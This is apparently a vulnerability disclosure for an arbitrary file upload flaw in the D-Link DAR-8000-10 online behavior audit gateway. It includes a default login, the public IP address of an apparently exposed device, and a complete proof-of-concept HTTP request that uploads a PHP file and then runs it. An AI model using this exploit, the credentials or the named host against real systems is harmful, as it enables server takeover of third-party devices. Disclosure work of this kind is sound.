The full version of the D-LINK DAR-8000-10 series online behavior audit gateway has a file upload vulnerability. Attackers can exploit vulnerabilities to gain server privileges or cause business impact on the system.

official： http://www.dlink.com.cn/

version:DAR-8000-10  DAR V31R02B1413C

Vulnerability Path ：/sysmanage/licence.php

Ip：https://59.60.19.174:8443/

Log in to the system using the default password：test/admin@123
<img width="732" alt="图片" src="https://github.com/llixixi/cve/assets/144869546/cfc0e895-5b3f-4cbc-8f89-d2f1bebd075b">

POC：
```
POST /sysmanage/licence.php? HTTP/1.1
Host: 
Cookie: PHPSESSID=26a1775947167e57a44ae5a532938679
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------42328904123665875270630079328
Content-Length: 714
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close

-----------------------------42328904123665875270630079328
Content-Disposition: form-data; name="ck"

radhttp
-----------------------------42328904123665875270630079328
Content-Disposition: form-data; name="file_upload"; filename="phpinfo.php"
Content-Type: application/octet-stream

<?php phpinfo()?>
-----------------------------42328904123665875270630079328
Content-Disposition: form-data; name="hid_tftp_ip"


-----------------------------42328904123665875270630079328
Content-Disposition: form-data; name="hid_ftp_ip"


-----------------------------42328904123665875270630079328
Content-Disposition: form-data; name="mode"

set
-----------------------------42328904123665875270630079328—

```
https://59.60.19.174:8443/home/upload/phpinfo.php
<img width="721" alt="图片" src="https://github.com/llixixi/cve/assets/144869546/af095f43-55a5-4f4f-a5b2-9b6fb90a199b">
